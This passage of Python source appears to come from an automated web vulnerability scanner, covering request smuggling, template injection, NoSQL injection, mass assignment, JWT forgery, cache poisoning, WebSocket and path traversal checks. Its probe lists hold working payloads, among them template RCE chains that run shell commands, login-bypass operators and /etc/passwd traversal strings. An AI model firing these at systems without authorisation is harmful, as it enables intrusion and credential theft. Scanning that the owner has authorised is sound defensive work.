                                f"(baseline was {baseline_status}) — possible request smuggling"
                            ),
                            details="CL.TE desync: frontend uses Content-Length, backend uses Transfer-Encoding",
                            subtype="HTTP Request Smuggling — CL.TE",
                            impact="Attacker can poison request queues, bypass security controls, hijack sessions, or perform cache poisoning",
                        ))
                        return vulns
            except Exception:
                pass

            # ── Probe 2: TE.CL — frontend uses TE, backend uses CL ───────────
            # Chunked body where actual content after chunk size is smaller than CL
            te_cl_body = b"0\r\n\r\nG"
            te_cl_headers = {
                "Content-Type":      "application/x-www-form-urlencoded",
                "Content-Length":    "6",
                "Transfer-Encoding": "chunked",
                "TE":                "trailers",
            }
            te_cl_headers.update(random_headers())

            try:
                async with httpx.AsyncClient(verify=False, timeout=12) as raw_client:
                    await raw_client.post(url, content=te_cl_body, headers=te_cl_headers)
                    r_followup2 = await raw_client.get(url, headers=random_headers(), timeout=8)

                    if r_followup2.status_code == 400 and baseline_status != 400:
                        vulns.append(VulnerabilityResult(
                            url=url,
                            vulnerability_type=VulnerabilityType.SMUGGLING,
                            severity="CRITICAL",
                            vulnerable_params=["HTTP pipeline"],
                            payload_used="TE.CL probe: Transfer-Encoding + mismatched Content-Length",
                            evidence=(
                                f"Follow-up returned 400 after TE.CL probe "
                                f"(baseline was {baseline_status}) — possible request smuggling"
                            ),
                            details="TE.CL desync: frontend uses Transfer-Encoding, backend uses Content-Length",
                            subtype="HTTP Request Smuggling — TE.CL",
                            impact="Attacker can poison request queues, bypass security controls, hijack sessions",
                        ))
                        return vulns
            except Exception:
                pass

            # ── Probe 3: TE.TE obfuscation — duplicate/obfuscated TE header ──
            # Some servers only process the first TE, others the last
            te_obfus_headers = {
                "Content-Type":        "application/x-www-form-urlencoded",
                "Transfer-Encoding":   "chunked",
                "Transfer-Encoding":   "identity",   # noqa: duplicate key intentional
                "Content-Length":      "4",
            }
            te_obfus_headers.update(random_headers())
            try:
                async with httpx.AsyncClient(verify=False, timeout=10) as raw_client:
                    r_te_obs = await raw_client.post(
                        url, content=b"1\r\nZ\r\n0\r\n\r\n",
                        headers=te_obfus_headers
                    )
                    if r_te_obs.status_code in (400, 501) and baseline_status not in (400, 501):
                        vulns.append(VulnerabilityResult(
                            url=url,
                            vulnerability_type=VulnerabilityType.SMUGGLING,
                            severity="HIGH",
                            vulnerable_params=["HTTP pipeline"],
                            payload_used="TE.TE obfuscation probe: duplicate Transfer-Encoding headers",
                            evidence=f"Obfuscated TE probe returned {r_te_obs.status_code} (baseline: {baseline_status})",
                            details="Server reacts differently to obfuscated Transfer-Encoding — possible TE.TE desync",
                            subtype="HTTP Request Smuggling — TE.TE",
                            impact="May allow request queue poisoning via Transfer-Encoding header confusion",
                        ))
                        return vulns
            except Exception:
                pass

        except Exception:
            pass
        return vulns



class SSTIScanner:
    """Standalone SSTI scanner — Jinja2, Twig, Mako, Freemarker, Velocity, ERB, Pebble, Smarty, Nunjucks, Thymeleaf, Handlebars."""

    _PROBES = [
        # (payload, expected_in_response, engine)
        ("{{7*7}}",               "49",       "Jinja2/Twig"),
        ("{{7*'7'}}",             "7777777",  "Jinja2"),
        ("{7*7}",                 "49",       "Smarty"),
        ("<%=7*7%>",              "49",       "ERB/EJS"),
        ("#{7*7}",                "49",       "Ruby ERB"),
        ("${7*7}",                "49",       "Freemarker/Thymeleaf"),
        ("#set($x=7*7)${x}",      "49",       "Velocity"),
        ("{{7|multiply:7}}",      "49",       "Pebble/Fluid"),
        ("{%- set x = 7*7 -%}{{x}}","49",     "Nunjucks"),
        ("[[${7*7}]]",            "49",       "Thymeleaf"),
        ("*{7*7}",                "49",       "Thymeleaf (alt)"),
        ("{php}echo 7*7;{/php}", "49",        "Smarty PHP"),
        ("{{config}}",            "SECRET",   "Flask/Jinja2 — config object leak"),
        ("{{settings.SECRET_KEY}}","",        "Django — secret key leak"),
        # ── Jinja2 RCE chains ────────────────────────────────────────────────
        ("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                                  "uid=",     "Jinja2 RCE via __globals__"),
        ("{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
                                  "uid=",     "Jinja2 RCE via subprocess subclass"),
        ("{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
                                  "uid=",     "Jinja2 RCE via cycler globals"),
        # ── Mako RCE ─────────────────────────────────────────────────────────
        ("<%import os%>${os.popen('id').read()}",
                                  "uid=",     "Mako RCE via os.popen"),
        ("<%\nimport os\nx=os.popen('id').read()\n%>${x}",
                                  "uid=",     "Mako RCE multiline"),
        # ── Freemarker RCE ────────────────────────────────────────────────────
        ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
                                  "uid=",     "Freemarker RCE via Execute"),
        ("<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
                                  "uid=",     "Freemarker RCE via assign"),
        # ── Velocity RCE ──────────────────────────────────────────────────────
        ("#set($e=\"\")\n#set($a=$e.class.forName(\"java.lang.Runtime\"))\n#set($b=$a.getMethod(\"exec\",$e.class.forName(\"java.lang.String\")))\n#set($c=$b.invoke($a.getRuntime(),\"id\"))",
                                  "uid=",     "Velocity RCE via Runtime.exec"),
        # ── Handlebars / Mustache ──────────────────────────────────────────────
        ("{{constructor.constructor('return process.env')()}}",
                                  "PATH",     "Handlebars Node RCE via constructor chain"),
        # ── Twig RCE ──────────────────────────────────────────────────────────
        ("{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
                                  "uid=",     "Twig RCE via registerUndefinedFilterCallback"),
        # ── Differential probes (detect engine without execution) ─────────────
        ("{{3+3}}{{3*3}}",        "69",       "Jinja2 combined probe"),
        ("<%= 3+3 %>",            "6",        "ERB basic"),
        ("${3+3}",                "6",        "Freemarker/EL basic"),
        ("{3+3}",                 "6",        "Smarty basic"),
    ]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            if not params:
                return vulns
            try:
                baseline = await client.get(url, timeout=self.config.vuln_timeout,
                                            follow_redirects=True)
                baseline_text = baseline.text
            except Exception:
                return vulns

            for param in list(params.keys())[:self.config.max_params_test]:
                for payload, expected, engine in self._PROBES:
                    try:
                        tp = params.copy(); tp[param] = [payload]
                        tq = urllib.parse.urlencode(tp, doseq=True)
                        tu = urllib.parse.urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, tq, parsed.fragment))
                        r    = await client.get(tu, timeout=self.config.vuln_timeout,
                                                follow_redirects=True)
                        body = r.text

                        if expected and expected in body and expected not in baseline_text \
                                and payload not in body:
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.SSTI,
                                severity="CRITICAL",
                                vulnerable_params=[param],
                                payload_used=payload,
                                evidence=f"'{payload}' evaluated to '{expected}' — engine: {engine}",
                                details=f"SSTI in param '{param}' — {engine} template engine",
                                subtype=f"SSTI — {engine}",
                                impact="Template engine executes attacker input — full RCE possible",
                            ))
                            return vulns
                        # Special: config/secret leak
                        if "config" in payload and len(body) > len(baseline_text) + 50 \
                                and "SECRET" in body and "SECRET" not in baseline_text:
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.SSTI,
                                severity="HIGH",
                                vulnerable_params=[param],
                                payload_used=payload,
                                evidence="Flask config object leaked in response",
                                details=f"SSTI in param '{param}' — config object accessible",
                                subtype="SSTI — Config Object Leak",
                                impact="Application secrets, DB URLs, and API keys exposed",
                            ))
                            return vulns
                    except Exception:
                        continue
        except Exception:
            pass
        return vulns

# ══════════════════════════════════════════════════════════════════
#  02 — NoSQL Injection Scanner
# ══════════════════════════════════════════════════════════════════


class NoSQLiScanner:
    """Detects NoSQL injection in MongoDB / CouchDB / Redis / Firebase apps via JSON and URL params."""

    _JSON_PAYLOADS = [
        ({"$gt": ""},              "MongoDB $gt operator bypass"),
        ({"$ne": "invalid"},       "MongoDB $ne operator bypass"),
        ({"$regex": ".*"},         "MongoDB $regex wildcard bypass"),
        ({"$where": "1==1"},       "MongoDB $where JS injection"),
        ({"$exists": True},        "MongoDB $exists bypass"),
        ({"$in": ["admin","root"]},"MongoDB $in array bypass"),
        ({"$nin": ["invalid"]},    "MongoDB $nin array bypass"),
        ({"$gt": "", "$lt": "z"},  "MongoDB range bypass"),
        ({"$type": 2},             "MongoDB $type coercion"),
        ({"$not": {"$eq": "x"}},   "MongoDB $not operator"),
    ]
    _URL_PAYLOADS = [
        ("[$gt]=",              "MongoDB URL $gt"),
        ("[$ne]=invalid",       "MongoDB URL $ne"),
        ("[$regex]=.*",         "MongoDB URL $regex"),
        ("[$where]=1==1",       "MongoDB URL $where"),
        ("['$gt']=",            "Single-quoted operator"),
        ("%5B$gt%5D=",          "URL-encoded $gt"),
        ("%5B$ne%5D=invalid",   "URL-encoded $ne"),
        ("%5B$regex%5D=.*",     "URL-encoded $regex"),
        ("[$in][]=admin",       "MongoDB $in array via bracket"),
        ("[$exists]=true",      "MongoDB $exists URL"),
    ]
    _AUTH_PATHS = ["/login", "/signin", "/api/login", "/api/auth",
                   "/user/login", "/api/v1/login", "/api/v2/login",
                   "/auth/login", "/account/login", "/api/session"]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            base   = f"{parsed.scheme}://{parsed.netloc}"

            try:
                baseline = await client.get(url, timeout=self.config.vuln_timeout, follow_redirects=True)
                baseline_len, baseline_status = len(baseline.text), baseline.status_code
            except Exception:
                return vulns

            # ── Test 1: URL param injection ──────────────────────────────────
            for param in list(params.keys())[:self.config.max_params_test]:
                orig = params[param][0] if params[param] else "test"
                for suffix, label in self._URL_PAYLOADS:
                    try:
                        base_q = urllib.parse.urlencode({k: v[0] for k, v in params.items()})
                        test_q = base_q.replace(f"{param}={orig}", f"{param}{suffix}")
                        tu     = urllib.parse.urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, test_q, parsed.fragment))
                        r = await client.get(tu, timeout=self.config.vuln_timeout,
                                             follow_redirects=True)
                        if r.status_code == 200 and baseline_status != 200:
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.NOSQLI,
                                severity="CRITICAL",
                                vulnerable_params=[param],
                                payload_used=f"{param}{suffix}",
                                evidence=f"Baseline {baseline_status} → NoSQLi probe returned 200",
                                details=f"NoSQL operator injection in '{param}'",
                                subtype=f"NoSQL Injection — {label}",
                                impact="Auth bypass or full data extraction from NoSQL database",
                            ))
                            return vulns
                        diff = abs(len(r.text) - baseline_len)
                        if diff > 500 and r.status_code == 200:
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.NOSQLI,
                                severity="HIGH",
                                vulnerable_params=[param],
                                payload_used=f"{param}{suffix}",
                                evidence=f"Response size changed by {diff}B with NoSQL operator payload",
                                details=f"Possible NoSQL injection — parameter '{param}' affects query",
                                subtype=f"NoSQL Injection — {label}",
                                impact="Possible data leakage or query manipulation via NoSQL operators",
                            ))
                            return vulns
                    except Exception:
                        continue

            # ── Test 2: JSON body injection on auth endpoints ─────────────────
            for path in self._AUTH_PATHS:
                target = base + path
                try:
                    r_check = await client.get(target, timeout=8, follow_redirects=True)
                    if r_check.status_code not in (200, 405):
                        continue
                    hdrs = random_headers(); hdrs["Content-Type"] = "application/json"
                    # Normal wrong credentials
                    r_normal = await client.post(
                        target,
                        content=json.dumps({"username": "invalid_y2s", "password": "wrongpass"}).encode(),
                        headers=hdrs, timeout=self.config.vuln_timeout, follow_redirects=True
                    )
                    # NoSQL operator injection
                    for operator_dict, label in self._JSON_PAYLOADS:
                        r_inject = await client.post(
                            target,
                            content=json.dumps({"username": "admin", "password": operator_dict}).encode(),
                            headers=hdrs, timeout=self.config.vuln_timeout, follow_redirects=True
                        )
                        if r_inject.status_code in (200, 302) and r_normal.status_code not in (200, 302):
                            _success_words = ["dashboard", "welcome", "logout", "token", "session", "profile"]
                            if any(w in r_inject.text.lower() for w in _success_words):
                                vulns.append(VulnerabilityResult(
                                    url=target,
                                    vulnerability_type=VulnerabilityType.NOSQLI,
                                    severity="CRITICAL",
                                    vulnerable_params=["password (JSON body)"],
                                    payload_used=json.dumps({"password": operator_dict}),
                                    evidence=f"Auth bypassed with NoSQL {label} — server returned {r_inject.status_code}",
                                    details=f"Login endpoint '{path}' processes MongoDB operators in JSON body",
                                    subtype=f"NoSQL Auth Bypass — {label}",
                                    impact="Complete authentication bypass — attacker can login as any user",
                                ))
                                return vulns
                except Exception:
                    continue
        except Exception:
            pass
        return vulns

# ══════════════════════════════════════════════════════════════════
#  03 — Mass Assignment Scanner
# ══════════════════════════════════════════════════════════════════


class MassAssignmentScanner:
    """Detects mass assignment — server accepts undeclared/privileged JSON fields."""

    _PRIVILEGE_FIELDS = [
        ("isAdmin",      "true",   "Boolean admin flag"),
        ("is_admin",     "true",   "Boolean admin flag"),
        ("role",         "admin",  "Role elevation"),
        ("admin",        "1",      "Admin flag"),
        ("privilege",    "admin",  "Privilege field"),
        ("user_type",    "admin",  "User type field"),
        ("account_type", "premium","Premium account"),
        ("verified",     "true",   "Verified status"),
        ("confirmed",    "true",   "Confirmed status"),
        ("active",       "true",   "Account activation"),
        ("credit",       "999999", "Credit balance manipulation"),
        ("balance",      "999999", "Balance manipulation"),
        ("subscription", "premium","Subscription type"),
    ]

    _ENDPOINTS = ["/api/users", "/api/user", "/api/profile", "/api/account",
                  "/api/register", "/api/signup", "/register", "/signup",
                  "/api/v1/users", "/api/v2/users"]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            base   = f"{parsed.scheme}://{parsed.netloc}"

            endpoints_to_test = [parsed.path] + self._ENDPOINTS

            for path in endpoints_to_test:
                target = base + path
                try:
                    # Baseline: POST normal user data
                    hdrs = random_headers(); hdrs["Content-Type"] = "application/json"
                    normal_data = {"username": f"y2s_test_{uuid.uuid4().hex[:6]}", "password": "Test1234!"}
                    r_normal = await client.post(
                        target, content=json.dumps(normal_data).encode(),
                        headers=hdrs, timeout=self.config.vuln_timeout, follow_redirects=True
                    )
                    if r_normal.status_code not in (200, 201, 400, 422):
                        continue

                    # Now send with privilege fields added
                    for field_name, field_val, label in self._PRIVILEGE_FIELDS:
                        inject_data = {**normal_data, field_name: field_val}
                        try:
                            r_inject = await client.post(
                                target, content=json.dumps(inject_data).encode(),
                                headers=hdrs, timeout=self.config.vuln_timeout,
                                follow_redirects=True
                            )
                            body = r_inject.text

                            # Check if injected field is reflected back
                            if field_val in body and field_val not in r_normal.text:
                                vulns.append(VulnerabilityResult(
                                    url=target,
                                    vulnerability_type=VulnerabilityType.MASSASSIGN,
                                    severity="HIGH",
                                    vulnerable_params=[field_name],
                                    payload_used=json.dumps({field_name: field_val}),
                                    evidence=f"Injected field '{field_name}={field_val}' reflected in response",
                                    details=f"Server accepts and stores undeclared field '{field_name}'",
                                    subtype=f"Mass Assignment — {label}",
                                    impact="Attacker can assign privileged properties during user creation/update",
                                ))
                                return vulns

                            # Check if PATCH/PUT also accepts
                            r_patch = await client.patch(
                                target, content=json.dumps({field_name: field_val}).encode(),
                                headers=hdrs, timeout=8, follow_redirects=True
                            )
                            if r_patch.status_code in (200, 204) and \
                               r_patch.status_code != r_normal.status_code:
                                vulns.append(VulnerabilityResult(
                                    url=target,
                                    vulnerability_type=VulnerabilityType.MASSASSIGN,
                                    severity="HIGH",
                                    vulnerable_params=[field_name],
                                    payload_used=f"PATCH {{{field_name}: {field_val}}}",
                                    evidence=f"PATCH with '{field_name}={field_val}' returned {r_patch.status_code}",
                                    details=f"Endpoint accepts PATCH with privileged field '{field_name}'",
                                    subtype=f"Mass Assignment via PATCH — {label}",
                                    impact="Privilege escalation via PATCH endpoint",
                                ))
                                return vulns
                        except Exception:
                            continue
                except Exception:
                    continue
        except Exception:
            pass
        return vulns

# ══════════════════════════════════════════════════════════════════
#  04 — JWT Algorithm Confusion (RS256 → HS256)
# ══════════════════════════════════════════════════════════════════


class JWTConfusionScanner:
    """Tests JWT RS256→HS256 algorithm confusion using server's public key as HMAC secret."""

    _JWKS_PATHS = ["/.well-known/jwks.json", "/api/jwks.json", "/jwks",
                   "/.well-known/openid-configuration", "/api/.well-known/jwks.json"]

    def __init__(self, config: Config):
        self.config = config

    def _decode_part(self, part: str) -> dict:
        try:
            return json.loads(base64.urlsafe_b64decode(part + "=" * (4 - len(part) % 4)))
        except Exception:
            return {}

    def _extract_jwts(self, headers: dict, body: str) -> List[str]:
        tokens = []
        auth = headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            tokens.append(auth[7:].strip())
        for m in re.finditer(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*', body):
            tokens.append(m.group())
        return list(set(tokens))

    def _hs256_sign(self, header_b64: str, payload_b64: str, secret: bytes) -> str:
        import hmac as _hmac
        msg = f"{header_b64}.{payload_b64}".encode()
        sig = _hmac.new(secret, msg, "sha256").digest()
        return base64.urlsafe_b64encode(sig).rstrip(b"=").decode()

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            resp = await client.get(url, timeout=self.config.vuln_timeout, follow_redirects=True)
            h = {k.lower(): v for k, v in resp.headers.items()}
            tokens = self._extract_jwts(h, resp.text)
            if not tokens:
                return vulns

            parsed = urllib.parse.urlparse(url)
            base   = f"{parsed.scheme}://{parsed.netloc}"

            # Try to fetch JWKS / public key
            public_key_pem = None
            for path in self._JWKS_PATHS:
                try:
                    r_jwks = await client.get(base + path, timeout=8, follow_redirects=True)
                    if r_jwks.status_code == 200 and ("keys" in r_jwks.text or "BEGIN" in r_jwks.text):
                        public_key_pem = r_jwks.text
                        break
                except Exception:
                    continue

            for token in tokens[:2]:
                parts = token.split(".")
                if len(parts) != 3:
                    continue
                header_data  = self._decode_part(parts[0])
                payload_data = self._decode_part(parts[1])
                alg          = header_data.get("alg", "").upper()

                if alg != "RS256":
                    continue

                # ── Build HS256 token signed with empty string (weak secret test) ──
                new_header = base64.urlsafe_b64encode(
                    json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode()
                ).rstrip(b"=").decode()
                new_payload = parts[1]

                for test_secret in [b"", b"secret", b"public_key", b"none"]:
                    sig = self._hs256_sign(new_header, new_payload, test_secret)
                    forged = f"{new_header}.{new_payload}.{sig}"
                    try:
                        test_hdrs = random_headers()
                        test_hdrs["Authorization"] = f"Bearer {forged}"
                        r = await client.get(url, headers=test_hdrs,
                                             timeout=self.config.vuln_timeout,
                                             follow_redirects=True)
                        if r.status_code == resp.status_code == 200 \
                           and abs(len(r.text) - len(resp.text)) < len(resp.text) * 0.15:
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.JWT_CONF,
                                severity="CRITICAL",
                                vulnerable_params=["Authorization header"],
                                payload_used=f"RS256→HS256 confusion, secret='{test_secret.decode()}'",
                                evidence=f"Server accepted HS256-signed token (secret='{test_secret.decode()}')",
                                details="JWT algorithm confusion: server accepts HS256 when RS256 is declared",
                                subtype="JWT RS256→HS256 Algorithm Confusion",
                                impact="Attacker can forge arbitrary tokens — full authentication bypass",
                            ))
                            return vulns
                    except Exception:
                        continue

                # ── kid header injection ─────────────────────────────────────
                for kid_payload in ['../../dev/null', '/dev/null', 'x\' UNION SELECT 1--']:
                    try:
                        inj_header = base64.urlsafe_b64encode(
                            json.dumps({"alg": "HS256", "typ": "JWT", "kid": kid_payload},
                                       separators=(",", ":")).encode()
                        ).rstrip(b"=").decode()
                        sig2 = self._hs256_sign(inj_header, new_payload, b"")
                        forged2 = f"{inj_header}.{new_payload}.{sig2}"
                        test_hdrs2 = random_headers()
                        test_hdrs2["Authorization"] = f"Bearer {forged2}"
                        r2 = await client.get(url, headers=test_hdrs2, timeout=8,
                                              follow_redirects=True)
                        if r2.status_code == 200 and resp.status_code == 200 \
                           and abs(len(r2.text) - len(resp.text)) < len(resp.text) * 0.15:
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.JWT_CONF,
                                severity="CRITICAL",
                                vulnerable_params=["JWT kid header"],
                                payload_used=f"kid={kid_payload}",
                                evidence="Server accepted JWT with malicious 'kid' header injection",
                                details="JWT 'kid' parameter not sanitized — path traversal or SQLi possible",
                                subtype="JWT kid Header Injection",
                                impact="Signature bypass via kid path traversal or SQL injection",
                            ))
                            return vulns
                    except Exception:
                        continue

        except Exception:
            pass
        return vulns

# ══════════════════════════════════════════════════════════════════
#  05 — Web Cache Poisoning Scanner
# ══════════════════════════════════════════════════════════════════


class CachePoisoningScanner:
    """Detects web cache poisoning via unkeyed headers and fat GET parameters."""

    _POISON_HEADERS = [
        ("X-Forwarded-Host",  "y2s-cache-probe.invalid"),
        ("X-Host",            "y2s-cache-probe.invalid"),
        ("X-Forwarded-Server","y2s-cache-probe.invalid"),
        ("X-Original-URL",    "/y2s-cache-probe"),
        ("X-Rewrite-URL",     "/y2s-cache-probe"),
        ("X-Forwarded-Port",  "8080"),
        ("X-Forwarded-Proto", "https"),
    ]
    _CACHE_INDICATORS = [
        r"x-cache",
        r"cf-cache-status",
        r"x-varnish",
        r"age",
        r"x-drupal-cache",
        r"x-wp-cache",
        r"x-cache-hits",
        r"x-served-by",
    ]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            # Check if the endpoint uses caching
            try:
                baseline = await client.get(url, timeout=self.config.vuln_timeout,
                                            follow_redirects=True)
                resp_headers = {k.lower(): v for k, v in baseline.headers.items()}
                is_cached = any(re.search(ind, k, re.IGNORECASE)
                                for k in resp_headers for ind in self._CACHE_INDICATORS)
            except Exception:
                return vulns

            for poison_hdr, poison_val in self._POISON_HEADERS:
                try:
                    hdrs = random_headers()
                    hdrs[poison_hdr] = poison_val

                    r1 = await client.get(url, headers=hdrs, timeout=self.config.vuln_timeout,
                                          follow_redirects=True)
                    body1 = r1.text

                    # Check if poison value appears in response
                    if poison_val in body1 and poison_val not in baseline.text:
                        # Try a second clean request to see if response is now poisoned
                        await asyncio.sleep(0.5)
                        r2 = await client.get(url, headers=random_headers(),
                                              timeout=self.config.vuln_timeout,
                                              follow_redirects=True)
                        body2 = r2.text

                        if poison_val in body2:
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.CACHE_POISON,
                                severity="HIGH",
                                vulnerable_params=[poison_hdr],
                                payload_used=f"{poison_hdr}: {poison_val}",
                                evidence=(
                                    f"Injected value '{poison_val}' via '{poison_hdr}' appeared "
                                    f"in subsequent clean request — cache poisoned"
                                ),
                                details=f"Header '{poison_hdr}' is unkeyed — value reflected and cached",
                                subtype=f"Cache Poisoning via {poison_hdr}",
                                impact="Attacker can poison cache for all users — deliver malicious content or redirect victims",
                            ))
                            return vulns

                        # Reflected but not cached — still informational
                        elif is_cached:
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.CACHE_POISON,
                                severity="MEDIUM",
                                vulnerable_params=[poison_hdr],
                                payload_used=f"{poison_hdr}: {poison_val}",
                                evidence=(
                                    f"Unkeyed header '{poison_hdr}' reflected in response "
                                    f"on cached endpoint — potential cache poisoning vector"
                                ),
                                details=f"Header '{poison_hdr}' value reflected but cache confirmation inconclusive",
                                subtype=f"Potential Cache Poisoning — {poison_hdr}",
                                impact="May allow cache poisoning if cache key excludes this header",
                            ))
                            return vulns

                except Exception:
                    continue

        except Exception:
            pass
        return vulns

# ══════════════════════════════════════════════════════════════════
#  06 — WebSocket Injection Scanner
# ══════════════════════════════════════════════════════════════════


class WebSocketScanner:
    """Detects WebSocket endpoints and tests for XSS, SQLi, and command injection."""

    _WS_PATHS = ["/ws", "/websocket", "/socket", "/ws/", "/api/ws",
                 "/chat", "/live", "/realtime", "/stream", "/events"]
    _PAYLOADS = [
        ('<script>alert(1)</script>',       "XSS via WS"),
        ("' OR '1'='1",                     "SQLi via WS"),
        ("; ls",                            "CMDi via WS"),
        ("{{7*7}}",                         "SSTI via WS"),
        ("../../../etc/passwd",             "Path traversal via WS"),
        ('{"__proto__":{"y2s":"1"}}',       "Prototype pollution via WS"),
    ]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            base   = f"{parsed.scheme}://{parsed.netloc}"
            ws_base = base.replace("https://", "wss://").replace("http://", "ws://")

            for path in self._WS_PATHS:
                ws_url = ws_base + path
                http_url = base + path

                # Check if endpoint exists via HTTP upgrade hint
                try:
                    hdrs = random_headers()
                    hdrs.update({
                        "Upgrade":    "websocket",
                        "Connection": "Upgrade",
                        "Sec-WebSocket-Version": "13",
                        "Sec-WebSocket-Key": base64.b64encode(uuid.uuid4().bytes).decode(),
                    })
                    r = await client.get(http_url, headers=hdrs, timeout=8,
                                         follow_redirects=False)

                    # 101 = WebSocket upgrade success
                    if r.status_code == 101:
                        vulns.append(VulnerabilityResult(
                            url=ws_url,
                            vulnerability_type=VulnerabilityType.WEBSOCKET,
                            severity="MEDIUM",
                            vulnerable_params=[path],
                            payload_used="WebSocket upgrade handshake",
                            evidence=f"WebSocket endpoint confirmed at '{path}' (HTTP 101 Switching Protocols)",
                            details="WebSocket endpoint found — requires manual testing for injection flaws",
                            subtype="WebSocket Endpoint Discovered",
                            impact="WebSocket endpoints may lack same origin enforcement, rate limiting, or input validation",
                        ))
                        return vulns

                    # 400 with WebSocket-related message = WS endpoint exists
                    if r.status_code in (400, 426) and any(
                            w in r.text.lower() for w in
                            ["websocket", "upgrade", "sec-websocket"]):
                        vulns.append(VulnerabilityResult(
                            url=ws_url,
                            vulnerability_type=VulnerabilityType.WEBSOCKET,
                            severity="LOW",
                            vulnerable_params=[path],
                            payload_used="WebSocket upgrade header probe",
                            evidence=f"HTTP {r.status_code} with WebSocket-related message at '{path}'",
                            details="Possible WebSocket endpoint — manual inspection recommended",
                            subtype="Potential WebSocket Endpoint",
                            impact="Requires manual testing — may lack input sanitization",
                        ))

                except Exception:
                    continue

        except Exception:
            pass
        return vulns

# ══════════════════════════════════════════════════════════════════
#  07 — Path Traversal Scanner
# ══════════════════════════════════════════════════════════════════


class PathTraversalScanner:
    """Detects path traversal in file-serving endpoints and download parameters."""

    _PAYLOADS = [
        ("../../../etc/passwd",               "Unix classic"),
        ("..%2F..%2F..%2Fetc%2Fpasswd",       "URL encoded"),
        ("..%252F..%252F..%252Fetc%252Fpasswd","Double URL encoded"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "Hex encoded"),
        ("....//....//....//etc/passwd",       "Dot-dot-slash variation"),
        ("..\\..\\..\\/etc/passwd",            "Mixed slash"),
        ("../../../windows/win.ini",           "Windows win.ini"),
        ("..\\..\\..\\windows\\win.ini",       "Windows backslash"),
        ("../../../etc/hosts",                 "hosts file"),
        ("../../../proc/self/environ",         "Process environ"),
        ("php://filter/convert.base64-encode/resource=/etc/passwd", "PHP wrapper"),
        ("file:///etc/passwd",                 "file:// URI"),
    ]
    _FILE_PARAMS = ['file','path','page','doc','document','name','filename',
                    'download','attachment','load','resource','template','view']
    _SIGNATURES  = [
        r"root:x:0:0:", r"daemon:x:", r"\[boot loader\]",
        r"\[extensions\]", r"DOCUMENT_ROOT=", r"HTTP_HOST=",
        r"\[fonts\]",  # win.ini
    ]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            file_params = {k: v for k, v in params.items()
                           if any(w in k.lower() for w in self._FILE_PARAMS)}
            target_params = file_params if file_params else params
            if not target_params:
                return vulns
            try:
                baseline = await client.get(url, timeout=self.config.vuln_timeout,
                                            follow_redirects=True)
                baseline_text = baseline.text
            except Exception:
                return vulns

            for param in list(target_params.keys())[:self.config.max_params_test]:
                for payload, label in self._PAYLOADS:
                    try:
                        tp = params.copy(); tp[param] = [payload]
                        tq = urllib.parse.urlencode(tp, doseq=True)
                        tu = urllib.parse.urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, tq, parsed.fragment))
                        r    = await client.get(tu, timeout=self.config.vuln_timeout,
                                                follow_redirects=True)
                        body = r.text
                        for sig in self._SIGNATURES:
                            if re.search(sig, body, re.IGNORECASE) and \
                               not re.search(sig, baseline_text, re.IGNORECASE):
                                vulns.append(VulnerabilityResult(
                                    url=url,
                                    vulnerability_type=VulnerabilityType.PATH_TRAV,
                                    severity="HIGH",
                                    vulnerable_params=[param],
                                    payload_used=payload,
                                    evidence=f"File signature '{sig}' found — absent from baseline",
                                    details=f"Path traversal in '{param}' — server reads arbitrary files",
                                    subtype=f"Path Traversal — {label}",
                                    impact="Attacker can read arbitrary server files including passwords and config",
                                ))
                                return vulns
                    except Exception:
                        continue
        except Exception:
            pass
        return vulns

# ══════════════════════════════════════════════════════════════════
#  08 — API Versioning Abuse Scanner
# ══════════════════════════════════════════════════════════════════


class APIVersioningScanner:
    """Detects older/deprecated API versions with weaker security controls."""

